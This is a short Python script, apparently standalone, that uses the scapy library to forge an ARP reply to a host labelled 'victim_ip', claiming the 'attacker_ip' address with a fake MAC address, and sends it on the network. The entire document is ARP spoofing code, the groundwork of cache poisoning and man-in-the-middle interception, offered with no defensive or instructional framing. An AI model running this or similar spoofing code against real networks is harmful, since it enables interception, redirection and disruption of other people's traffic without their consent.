
from scapy.all import ARP, Ether, send


victim_ip = "10.33.67.174"

fake_mac = "f2:39:c5:c0:07:e5"

attacker_ip = "10.33.73.77"  


arp_response = ARP(op=2, pdst=victim_ip, psrc=attacker_ip, hwdst=fake_mac)
ether = Ether(dst=fake_mac) / arp_response


send(ether, verbose=0)